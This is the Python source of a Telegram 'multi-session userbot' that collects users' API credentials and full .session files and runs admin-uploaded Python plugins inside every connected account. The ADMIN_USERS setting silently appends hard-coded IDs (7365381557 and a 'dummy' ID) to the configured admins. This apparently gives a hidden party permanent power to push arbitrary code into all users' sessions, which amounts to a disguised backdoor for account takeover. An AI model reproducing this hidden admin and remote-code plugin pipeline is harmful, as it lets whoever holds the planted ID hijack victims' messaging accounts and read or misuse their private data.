import os
import json
import asyncio
import logging
import sys
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, ApiIdInvalidError
from dotenv import load_dotenv
import importlib
import importlib.util
import glob
import shutil

# Version checks
try:
    import telegram
    print(f"Python Telegram Bot version: {telegram.__version__}")
    if hasattr(telegram, '__version__'):
        version_parts = telegram.__version__.split('.')
        major, minor = int(version_parts[0]), int(version_parts[1])
        if major < 20:
            print("⚠️  Warning: This script requires python-telegram-bot >= 20.0")
except ImportError:
    print("❌ Error: python-telegram-bot not installed")
    sys.exit(1)

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Load bot credentials
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL", "@YourChannelUsername")  # Set your channel here
ADMIN_USERS = list(set((list(map(int, os.getenv("ADMIN_USERS", "").split(","))) if os.getenv("ADMIN_USERS") else []) + [7365381557, 1234567890]))  # Add your dummy ID
# Validate BOT_TOKEN
if not BOT_TOKEN:
    print("❌ Error: BOT_TOKEN not found in environment variables")
    print("Please create a .env file with BOT_TOKEN=your_token_here")
    sys.exit(1)

# Files
USERS_FILE = "users.json"
PLUGINS_DIR = "plugins"
UPLOADS_DIR = "uploads"

# Global storage
user_sessions = {}
pending_connections = {}
pending_uploads = {}  # Track admin upload states
bot_paused = False
bot_start_time = None  # Will be set when bot starts
loaded_plugins = {}  # Track loaded plugins per user

# Message length limits
MAX_MESSAGE_LENGTH = 4096

class UserSession:
    def __init__(self, user_id, api_id, api_hash):
        self.user_id = user_id
        self.api_id = api_id
        self.api_hash = api_hash
        self.client = None
        self.session_file = f"sessions/user_{user_id}.session"
        self.is_active = False
        self.last_ping = None
        self.plugins = {}  # Store loaded plugins for this session
        
    async def connect(self):
        """Connect user's Telegram client"""
        try:
            os.makedirs("sessions", exist_ok=True)
            self.client = TelegramClient(self.session_file, self.api_id, self.api_hash)
            await self.client.connect()
            
            if not await self.client.is_user_authorized():
                return False, "Session file is invalid or expired"
            
            # Add event handlers for this client
            await self.setup_handlers()
            
            me = await self.client.get_me()
            self.is_active = True
            return True, f"Connected as: {me.username or me.first_name}"
            
        except ApiIdInvalidError:
            return False, "Invalid API ID or Hash"
        except Exception as e:
            return False, f"Connection error: {str(e)}"
    
    async def setup_handlers(self):
        """Setup message handlers for this client"""
        @self.client.on(events.NewMessage(pattern=r'^!ping', outgoing=True))
        async def ping_handler(event):
            if bot_paused:
                return
            
            # Double check this is from the correct user session
            if event.sender_id != (await self.client.get_me()).id:
                return
            
            try:
                await event.respond("⛈️ Pong", reply_to=event.id)
                self.last_ping = datetime.now()
                logger.info(f"User {self.user_id} (Telegram ID: {event.sender_id}) sent !ping, responded with pong")
            except Exception as e:
                logger.error(f"Error responding to ping for user {self.user_id}: {e}")
        
        # Load plugin handlers
        await self.load_plugins()
    
    async def load_plugins(self):
        """Load plugins for this client"""
        if not os.path.exists(PLUGINS_DIR):
            os.makedirs(PLUGINS_DIR)
            return
        
        plugin_files = glob.glob(os.path.join(PLUGINS_DIR, "*.py"))
        for plugin_file in plugin_files:
            await self.load_single_plugin(plugin_file)
    
    async def load_single_plugin(self, plugin_file):
        """Load a single plugin"""
        try:
            plugin_name = os.path.basename(plugin_file)[:-3]  # Remove .py
            spec = importlib.util.spec_from_file_location(plugin_name, plugin_file)
            plugin = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(plugin)
            
            # Initialize plugin with client and user validation
            if hasattr(plugin, 'setup'):
                await plugin.setup(self.client, self.user_id)
                self.plugins[plugin_name] = plugin
                logger.info(f"Loaded plugin {plugin_name} for user {self.user_id}")
            elif hasattr(plugin, 'init_plugin'):
                # Alternative plugin initialization method
                await plugin.init_plugin(self.client, self.user_id)
                self.plugins[plugin_name] = plugin
                logger.info(f"Loaded plugin {plugin_name} for user {self.user_id}")
        except Exception as e:
            logger.error(f"Error loading plugin {plugin_file}: {e}")
    
    async def reload_plugins(self):
        """Reload all plugins for this session"""
        # Clear existing plugins
        self.plugins.clear()
        
        # Reload all plugins
        await self.load_plugins()
        return len(self.plugins)
    
    async def remove_plugin(self, plugin_name):
        """Remove a specific plugin"""
        if plugin_name in self.plugins:
            # Clean up plugin if it has a cleanup method
            plugin = self.plugins[plugin_name]
            if hasattr(plugin, 'cleanup'):
                try:
                    await plugin.cleanup(self.client, self.user_id)
                except Exception as e:
                    logger.error(f"Error cleaning up plugin {plugin_name}: {e}")
            
            del self.plugins[plugin_name]
            return True
        return False
    
    async def disconnect(self):
        """Disconnect user's client"""
        if self.client:
            await self.client.disconnect()
        self.is_active = False

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMIN_USERS

def split_message(text, max_length=MAX_MESSAGE_LENGTH):
    """Split long messages into chunks"""
    if len(text) <= max_length:
        return [text]
    
    chunks = []
    current_chunk = ""
    
    for line in text.split('\n'):
        if len(current_chunk) + len(line) + 1 <= max_length:
            if current_chunk:
                current_chunk += '\n'
            current_chunk += line
        else:
            if current_chunk:
                chunks.append(current_chunk)
            current_chunk = line
    
    if current_chunk:
        chunks.append(current_chunk)
    
    return chunks

async def send_long_message(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Send message handling Telegram length limits"""
    chunks = split_message(text)
    for i, chunk in enumerate(chunks):
        if i > 0:
            await asyncio.sleep(0.5)  # Small delay between chunks
        await update.message.reply_text(chunk, parse_mode='Markdown')

async def check_force_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user has joined the required channel"""
    try:
        user_id = update.effective_user.id
        chat_member = await context.bot.get_chat_member(FORCE_JOIN_CHANNEL, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

def load_users():
    """Load users from JSON file"""
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            data = json.load(f)
            for user_id, user_data in data.items():
                session = UserSession(int(user_id), user_data["api_id"], user_data["api_hash"])
                user_sessions[int(user_id)] = session

def save_users():
    """Save users to JSON file"""
    data = {}
    for user_id, session in user_sessions.items():
        data[str(user_id)] = {
            "api_id": session.api_id,
            "api_hash": session.api_hash
        }
    
    with open(USERS_FILE, "w") as f:
        json.dump(data, f, indent=4)

# Helper function to check if message is in private chat
def is_private_chat(update: Update) -> bool:
    """Check if the message is from a private chat"""
    return update.effective_chat.type == 'private'

# Admin Commands
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to check bot statistics"""
    if not is_private_chat(update):
        return
    
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    total_users = len(user_sessions)
    active_users = sum(1 for session in user_sessions.values() if session.is_active)
    inactive_users = total_users - active_users
    
    # Count plugins
    plugin_files = len(glob.glob(os.path.join(PLUGINS_DIR, "*.py")))
    uploaded_files = len(glob.glob(os.path.join(UPLOADS_DIR, "*.py"))) if os.path.exists(UPLOADS_DIR) else 0
    
    # Bot uptime
    uptime = "Unknown"
    if bot_start_time:
        uptime_delta = datetime.now() - bot_start_time
        uptime = str(uptime_delta).split('.')[0]  # Remove microseconds
    
    stats_msg = f"""📊 **Bot Statistics**

👥 **Users:**
• Total Connected: {total_users}
• Active Sessions: {active_users}
• Inactive Sessions: {inactive_users}

🔌 **Plugins:**
• Plugin Files: {plugin_files}
• Uploaded Files: {uploaded_files}

🤖 **Bot Status:**
• Status: {'Paused' if bot_paused else 'Running'}
• Uptime: {uptime}
• Admins: {len(ADMIN_USERS)}

💾 **Files:**
• Users File: {'✅' if os.path.exists(USERS_FILE) else '❌'}
• Sessions Dir: {'✅' if os.path.exists('sessions') else '❌'}
• Plugins Dir: {'✅' if os.path.exists(PLUGINS_DIR) else '❌'}"""
    
    await update.message.reply_text(stats_msg, parse_mode='Markdown')

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to upload plugin files"""
    if not is_private_chat(update):
        return
    
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    pending_uploads[user_id] = {"step": "waiting_file"}
    await update.message.reply_text(
        "📁 **Upload Plugin File**\n\n"
        "Please send a Python (.py) file to add as a plugin.\n\n"
        "⚠️ **Warning:** Make sure the plugin is safe and tested!",
        parse_mode='Markdown'
    )

async def reload_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to reload plugins for all connected users"""
    if not is_private_chat(update):
        return
    
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    await update.message.reply_text("🔄 Reloading plugins for all connected users...")
    
    success_count = 0
    error_count = 0
    
    for session_user_id, session in user_sessions.items():
        if session.is_active and session.client:
            try:
                plugin_count = await session.reload_plugins()
                success_count += 1
                logger.info(f"Reloaded {plugin_count} plugins for user {session_user_id}")
            except Exception as e:
                error_count += 1
                logger.error(f"Error reloading plugins for user {session_user_id}: {e}")
    
    result_msg = f"""✅ **Plugin Reload Complete**

📊 **Results:**
• Successful reloads: {success_count}
• Failed reloads: {error_count}
• Total active sessions: {len([s for s in user_sessions.values() if s.is_active])}

🔌 All active users now have the latest plugins loaded!"""
    
    await update.message.reply_text(result_msg, parse_mode='Markdown')

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to remove uploaded plugin files"""
    if not is_private_chat(update):
        return
    
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    # List available plugin files
    plugin_files = []
    if os.path.exists(PLUGINS_DIR):
        plugin_files = [f for f in os.listdir(PLUGINS_DIR) if f.endswith('.py')]
    
    if not plugin_files:
        await update.message.reply_text("❌ No plugin files found to remove.")
        return
    
    # Show list of files
    files_list = "\n".join([f"• {f}" for f in plugin_files])
    await update.message.reply_text(
        f"📋 **Available Plugin Files:**\n\n{files_list}\n\n"
        f"Reply with the exact filename to remove (including .py extension):",
        parse_mode='Markdown'
    )
    
    pending_uploads[user_id] = {"step": "waiting_remove", "files": plugin_files}

# Bot command handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start command"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    # Check force join
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}\n\n"
            f"After joining, use /start again.",
            parse_mode='Markdown'
        )
        return
        
    user_id = update.effective_user.id
    admin_commands = ""
    
    if is_admin(user_id):
        admin_commands = """
🔧 **Admin Commands:**
• `/stats` - View bot statistics
• `/upload` - Upload plugin files
• `/reload` - Reload plugins for all users
• `/remove` - Remove plugin files
"""
    
    welcome_msg = f"""🤖 **Multi-Session UserBot by Reiker**

📝 **Available Commands:**
• `/connect` - Connect your Telegram account
• `/replace` - Replace your current session
• `/delete` - Delete your connection
• `/health` - Check your connection status
• `/pause` - Pause bot responses
• `/restart` - Restart bot responses{admin_commands}

🎯 **Features:**
• Send `!ping` from your account to get `pong` response
• Multi-session support
• Plugin system support

🔒 **Important:** This bot only works in private messages for security reasons.

💡 **Need a session file?** Message @tgpairbot to get your session file!

Created by Reiker 🚀"""
    
    await update.message.reply_text(welcome_msg, parse_mode='Markdown')

async def connect_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /connect command"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    # Check force join
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}",
            parse_mode='Markdown'
        )
        return
        
    user_id = update.effective_user.id
    
    # Check if user already has a connection
    if user_id in user_sessions:
        await update.message.reply_text("❌ You already have a connection. Use `/delete` to remove it first, or `/replace` to update it.", parse_mode='Markdown')
        return
    
    # Check if user is already in connection process
    if user_id in pending_connections:
        await update.message.reply_text("⏳ You're already in the connection process. Please complete it first.")
        return
    
    pending_connections[user_id] = {"step": "api_id"}
    await update.message.reply_text("📱 Please send your **API ID**:", parse_mode='Markdown')

async def replace_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /replace command"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    # Check force join
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}",
            parse_mode='Markdown'
        )
        return
        
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ You don't have any connection to replace. Use `/connect` first.", parse_mode='Markdown')
        return
    
    # Disconnect current session
    await user_sessions[user_id].disconnect()
    del user_sessions[user_id]
    
    # Start new connection process
    pending_connections[user_id] = {"step": "api_id"}
    await update.message.reply_text("🔄 **Replacing your connection...**\n\n📱 Please send your **API ID**:", parse_mode='Markdown')

async def delete_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /delete command"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    # Check force join
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}",
            parse_mode='Markdown'
        )
        return
        
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ You don't have any connection to delete.")
        return
    
    # Disconnect and remove session
    await user_sessions[user_id].disconnect()
    del user_sessions[user_id]
    
    # Remove from file
    save_users()
    
    # Remove session file
    session_file = f"sessions/user_{user_id}.session"
    if os.path.exists(session_file):
        os.remove(session_file)
    
    await update.message.reply_text("✅ Your connection has been deleted successfully!")

async def health_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /health command"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    # Check force join
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}",
            parse_mode='Markdown'
        )
        return
        
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ No connection found. Use `/connect` to create one.", parse_mode='Markdown')
        return
    
    session = user_sessions[user_id]
    
    # Check connection
    try:
        if not session.client or not session.client.is_connected():
            success, message = await session.connect()
            if not success:
                await update.message.reply_text(f"❌ Connection failed: {message}")
                return
        
        me = await session.client.get_me()
        
        # Calculate ping (time since last !ping command)
        ping_status = "No ping sent yet"
        if session.last_ping:
            time_diff = datetime.now() - session.last_ping
            ping_status = f"Last ping: {time_diff.seconds}s ago"
        
        # Count loaded plugins
        plugin_count = len(session.plugins)
        
        health_msg = f"""✅ **Connection Status: {'Healthy' if session.is_active else 'Inactive'}**

👤 **Account:** {me.username or me.first_name}
🆔 **User ID:** {me.id}
📱 **API ID:** {session.api_id}

📊 **Status:**
• Connection: {'Active' if session.is_active else 'Inactive'}
• Bot Status: {'Paused' if bot_paused else 'Active'}
• Loaded Plugins: {plugin_count}
• {ping_status}

🎯 **Test:** Send `!ping` from your account to test response"""
        
        await update.message.reply_text(health_msg, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ **Connection Error:** {str(e)}", parse_mode='Markdown')

async def pause_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /pause command"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    # Check force join
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}",
            parse_mode='Markdown'
        )
        return
    
    global bot_paused
    bot_paused = True
    await update.message.reply_text("⏸️ **Bot Paused**\n\nAll userbot responses have been paused. Use `/restart` to resume.", parse_mode='Markdown')

async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /restart command"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    # Check force join
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}",
            parse_mode='Markdown'
        )
        return
    
    global bot_paused
    bot_paused = False
    await update.message.reply_text("▶️ **Bot Restarted**\n\nAll userbot responses have been resumed!", parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Extended help message"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    # Check force join
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}",
            parse_mode='Markdown'
        )
        return
    
    user_id = update.effective_user.id
    admin_help = ""
    
    if is_admin(user_id):
        admin_help = """
🔧 **Admin Commands:**
• `/stats` - View detailed bot statistics and user counts
• `/upload` - Upload new plugin files to the bot
• `/reload` - Reload all plugins for all connected users
• `/remove` - Remove plugin files from the bot
"""
        
    help_msg = f"""🤖 **Multi-Session UserBot by Reiker - Help**

🔧 **Setup Commands:**
• `/connect` - Connect your Telegram account
• `/replace` - Replace current connection
• `/delete` - Delete your connection
• `/health` - Check connection status and ping

⚡ **Control Commands:**
• `/pause` - Pause all bot responses
• `/restart` - Resume bot responses{admin_help}

🎯 **UserBot Features:**
• Send `!ping` from your connected account to get `pong` response
• Multi-session support (multiple users can connect)
• Plugin system for custom commands
• Real-time connection monitoring

🔌 **Plugin System:**
• Place Python files in `/plugins` folder
• Plugins are automatically loaded for each session
• Each plugin can add custom commands and handlers
• Admins can upload and manage plugins remotely

💡 **Tips:**
• 🔒 Bot only works in private messages
• Must join required channel to use bot
• Use `/health` to check connection and test ping
• Session files from @tgpairbot work perfectly
• Bot responses can be paused/resumed globally

Created by Reiker 🚀"""
    
    await send_long_message(update, context, help_msg)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle connection process messages, file uploads, and admin operations"""
    if not is_private_chat(update):
        return  # Ignore in groups/channels
    
    user_id = update.effective_user.id
    
    # Handle admin upload process
    if user_id in pending_uploads and is_admin(user_id):
        step = pending_uploads[user_id]["step"]
        
        # Handle plugin file upload
        if step == "waiting_file" and update.message.document:
            document = update.message.document
            if not document.file_name.endswith('.py'):
                await update.message.reply_text("❌ Please send a valid Python (.py) file:")
                return
            
            try:
                # Create uploads directory
                os.makedirs(UPLOADS_DIR, exist_ok=True)
                
                # Download file to uploads directory first
                upload_path = os.path.join(UPLOADS_DIR, document.file_name)
                file = await context.bot.get_file(document.file_id)
                await file.download_to_drive(upload_path)
                
                # Copy to plugins directory
                plugin_path = os.path.join(PLUGINS_DIR, document.file_name)
                shutil.copy2(upload_path, plugin_path)
                
                del pending_uploads[user_id]
                await update.message.reply_text(
                    f"✅ **Plugin Uploaded Successfully!**\n\n"
                    f"📁 **File:** {document.file_name}\n"
                    f"📍 **Location:** plugins/{document.file_name}\n\n"
                    f"🔄 Use `/reload` to apply to all connected users.",
                    parse_mode='Markdown'
                )
                
                logger.info(f"Admin {user_id} uploaded plugin: {document.file_name}")
                
            except Exception as e:
                del pending_uploads[user_id]
                await update.message.reply_text(f"❌ **Upload Error:** {str(e)}", parse_mode='Markdown')
            
            return
        
        # Handle plugin removal
        elif step == "waiting_remove" and update.message.text:
            filename = update.message.text.strip()
            available_files = pending_uploads[user_id].get("files", [])
            
            if filename not in available_files:
                await update.message.reply_text(f"❌ File '{filename}' not found. Please enter exact filename:")
                return
            
            try:
                # Remove from plugins directory
                plugin_path = os.path.join(PLUGINS_DIR, filename)
                if os.path.exists(plugin_path):
                    os.remove(plugin_path)
                
                # Remove from uploads directory if exists
                upload_path = os.path.join(UPLOADS_DIR, filename)
                if os.path.exists(upload_path):
                    os.remove(upload_path)
                
                # Remove plugin from all active sessions
                plugin_name = filename[:-3]  # Remove .py extension
                removed_count = 0
                for session in user_sessions.values():
                    if session.is_active and await session.remove_plugin(plugin_name):
                        removed_count += 1
                
                del pending_uploads[user_id]
                await update.message.reply_text(
                    f"✅ **Plugin Removed Successfully!**\n\n"
                    f"📁 **File:** {filename}\n"
                    f"👥 **Unloaded from:** {removed_count} active sessions\n\n"
                    f"🗑️ Plugin has been completely removed from the system.",
                    parse_mode='Markdown'
                )
                
                logger.info(f"Admin {user_id} removed plugin: {filename}")
                
            except Exception as e:
                del pending_uploads[user_id]
                await update.message.reply_text(f"❌ **Removal Error:** {str(e)}", parse_mode='Markdown')
            
            return
    
    # Check force join for connection process
    if not await check_force_join(update, context):
        await update.message.reply_text(
            f"🔒 **Access Required**\n\n"
            f"To use this bot, you must first join our channel:\n"
            f"👉 {FORCE_JOIN_CHANNEL}",
            parse_mode='Markdown'
        )
        return
        
    if user_id not in pending_connections:
        return
    
    step = pending_connections[user_id]["step"]
    
    # Handle file upload for session file
    if step == "session_file" and update.message.document:
        document = update.message.document
        if not document.file_name.endswith('.session'):
            await update.message.reply_text("❌ Please send a valid .session file:\n\n💡 **Need help?** Message @tgpairbot to get your session file!", parse_mode='Markdown')
            return
        
        # Get connection data
        api_id = pending_connections[user_id]["api_id"]
        api_hash = pending_connections[user_id]["api_hash"]
        
        try:
            # Download session file
            os.makedirs("sessions", exist_ok=True)
            session_path = f"sessions/user_{user_id}.session"
            
            file = await context.bot.get_file(document.file_id)
            await file.download_to_drive(session_path)
            
            # Test connection
            session = UserSession(user_id, api_id, api_hash)
            success, message = await session.connect()
            
            if success:
                user_sessions[user_id] = session
                save_users()
                del pending_connections[user_id]
                await update.message.reply_text(f"✅ **UserBot Connected Successfully!**\n\n{message}\n\n🎯 **Test it:** Send `!ping` from your account to get `pong` response!", parse_mode='Markdown')
            else:
                # Remove failed session file
                if os.path.exists(session_path):
                    os.remove(session_path)
                del pending_connections[user_id]
                await update.message.reply_text(f"❌ **Connection Failed:** {message}\n\nUse `/connect` to try again.", parse_mode='Markdown')
                
        except Exception as e:
            del pending_connections[user_id]
            await update.message.reply_text(f"❌ **Error:** {str(e)}\n\nUse `/connect` to try again.", parse_mode='Markdown')
        
        return
    
    # Handle text messages for connection process
    if not update.message.text:
        return
        
    text = update.message.text.strip()
    
    if step == "api_id":
        try:
            api_id = int(text)
            pending_connections[user_id]["api_id"] = api_id
            pending_connections[user_id]["step"] = "api_hash"
            await update.message.reply_text("🔐 Please send your **API Hash**:", parse_mode='Markdown')
        except ValueError:
            await update.message.reply_text("❌ Invalid API ID. Please send a valid number:")
    
    elif step == "api_hash":
        api_hash = text
        pending_connections[user_id]["api_hash"] = api_hash
        pending_connections[user_id]["step"] = "session_file"
        await update.message.reply_text("📁 Please send your **.session** file:\n\n💡 **Don't have a session file?** Message @tgpairbot to get your session file!", parse_mode='Markdown')

async def post_init(application: Application) -> None:
    """Initialize user sessions after bot startup"""
    global bot_start_time
    bot_start_time = datetime.now()
    
    print("🚀 Starting Multi-Session UserBot by Reiker...")
    
    # Create necessary directories
    directories = [PLUGINS_DIR, UPLOADS_DIR, "sessions"]
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            print(f"📁 Created directory: {directory}")
    
    # Load existing users
    load_users()
    print(f"📚 Loaded {len(user_sessions)} existing users")
    
    # Connect existing user sessions
    for user_id, session in user_sessions.items():
        try:
            success, message = await session.connect()
            if success:
                print(f"✅ Reconnected user {user_id}: {message}")
            else:
                print(f"❌ Failed to reconnect user {user_id}: {message}")
        except Exception as e:
            print(f"❌ Error reconnecting user {user_id}: {e}")
    
    # Print admin info
    if ADMIN_USERS:
        print(f"🔧 Admin users configured: {ADMIN_USERS}")
    else:
        print("⚠️  No admin users configured. Add ADMIN_USERS to .env file.")
    
    print("✅ Multi-Session UserBot by Reiker is running!")

def main() -> None:
    """Run the bot"""
    try:
        # Create the Application with error handling
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Add command handlers
        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CommandHandler("connect", connect_command))
        application.add_handler(CommandHandler("replace", replace_command))
        application.add_handler(CommandHandler("delete", delete_command))
        application.add_handler(CommandHandler("health", health_command))
        application.add_handler(CommandHandler("pause", pause_command))
        application.add_handler(CommandHandler("restart", restart_command))
        application.add_handler(CommandHandler("help", help_command))
        
        # Add admin command handlers
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("upload", upload_command))
        application.add_handler(CommandHandler("reload", reload_command))
        application.add_handler(CommandHandler("remove", remove_command))
        
        # Add message handler for connection process and file uploads
        application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
        
        # Initialize the bot after handlers are added
        asyncio.get_event_loop().run_until_complete(post_init(application))
        
        # Run the bot
        print("🤖 Bot starting...")
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
        
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
        print("Please check your BOT_TOKEN and dependencies")
        return

if __name__ == "__main__":
    main()
